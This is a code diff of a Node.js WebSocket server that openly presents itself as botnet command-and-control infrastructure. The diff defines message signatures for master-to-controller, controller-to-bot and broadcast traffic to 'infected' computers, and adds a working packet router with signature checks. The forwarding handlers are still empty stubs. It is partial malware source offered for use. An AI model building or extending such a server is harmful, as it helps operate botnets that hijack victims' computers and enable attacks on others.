@@ -1,5 +1,9 @@
+//#region [ IMPORTS ]
+
 const WebSockets = require('websocket');
 const http = require('http');
+
+//#endregion
 
 const server = http.createServer((req, res) => { res.writeHead(403).end(); });
 
@@ -13,25 +17,30 @@ const WebSockServer = new WebSockets.server({
   maxReceivedMessageSize: 65536
 });
 
+//#region [ CONSTANTS ]
+
 const MaxSingleHostsConnections = 1;
 const BotnetCommandControls = [
-  '\x23\x1a\x20\x17', //Master's command to specific bot
-  '\x27\x1c\x24\x19', //Master's command to all bots
-  '\xff\x1c\xfe\x1b', //Bot retrieving data after command execution
-  '\x9b\x1c\x66\x19', //Bot synchronize sequence (after infect computer)
-  '\x9b\x9b\x9d\xff'  //Master's forwarded command
+  '\x23\x1a\x20\x17', //Master -> Command Control         [  Unicast  ]
+  '\x27\x1c\x24\x19', //Command Control -> Bot            [  Unicast  ]
+  '\xff\x1c\xfe\x1b', //Bot -> Command Control            [  Unicast  ]
+  '\x9b\x1c\x66\x19', //Command Control -> Master         [  Unicast  ]
+  '\x9b\x9b\x9d\xff'  //Master -> Command Control -> All  [ Broadcast ]
 ];
 
 var OpennedSockets    = 0;
 var MaxOpennedSockets = 16;
 var SocketTable       = [];
 
+//#endregion
 
-function is_origin_allowed(origin) {
+//#region [ UTILITY FUNCTIONS ]
+
+function IsAllowedOrigin(origin) {
   return true;
 }
 
-function wsccbsum(m) {
+function SignatureCheck(m) {
   if (m.length < 4)
     return false;
   let s1 = m.charCodeAt(0);
@@ -41,14 +50,74 @@ function wsccbsum(m) {
   return (s1 % (e1 + 1) == s2 % (e2 + 1));
 }
 
+//#endregion
+
+//#region [ EVENT LISTENERS ]
+
+function FwdMasterToCommandControlEvt(payload){
+  //TODO
+}
+
+function FwdCommandControlToBotEvt(payload){
+  //TODO
+}
+
+function FwdBotToCommandControlEvt(payload){
+  //TODO
+}
+
+function FwdCommandControlToMasterEvt(payload){
+  //TODO
+}
+
+function FwdMasterToCommandControlToAllEvt(payload){
+  //TODO
+}
+
+//#endregion
+
+//#region [ PACKET ROUTER ]
+
+function OnPacketReceived(m){
+  let msig = [
+    m[0], m[1],
+    m[m.length-2],
+    m[m.length-1]
+  ];
+  let payload = m.substr(2).substr(0, m.length-4);
+  try{ payload = JSON.parse(payload); } catch(e){ return false; }
+  msig = msig.join('');
+  if (msig == BotnetCommandControls[0]){
+    FwdMasterToCommandControlEvt(payload);
+  } else 
+  if (msig == BotnetCommandControls[1]) {
+    FwdCommandControlToBotEvt(payload);
+  } else 
+  if (msig == BotnetCommandControls[2]) {
+    FwdBotToCommandControlEvt(payload);
+  } else 
+  if (msig == BotnetCommandControls[3]) {
+    FwdCommandControlToMasterEvt(payload);
+  } else 
+  if (msig == BotnetCommandControls[4]) {
+    FwdMasterToCommandControlToAllEvt(payload);
+  } else {
+    return false;
+  }
+  return true;
+}
+
+//#endregion
+
 WebSockServer.on('connect', (connection) => {
   OpennedSockets++;
   connection.on('message', (message) => {
     if (message.type == 'utf8'){
       let buffer = message.utf8Data;
-      if (!wsccbsum(buffer))
-        connection.drop(403, 'Invalid buffer received');
-      
+      if (!SignatureCheck(buffer))
+        connection.drop(403, 'Invalid signature provided');
+      if (!OnPacketReceived(buffer))
+        connection.drop(403, 'Cannot parse the payload data');
     } else {
       connection.drop(403, 'Invalid buffer received');
     }
@@ -56,7 +125,7 @@ WebSockServer.on('connect', (connection) => {
 });
 
 WebSockServer.on('request', (request) => {
-  (is_origin_allowed(request.origin) ? () => { 
+  (IsAllowedOrigin(request.origin) ? () => { 
     if (OpennedSockets == MaxOpennedSockets){
       request.reject(503, 'Maximum concurrent socket connections limit hit');
     } 
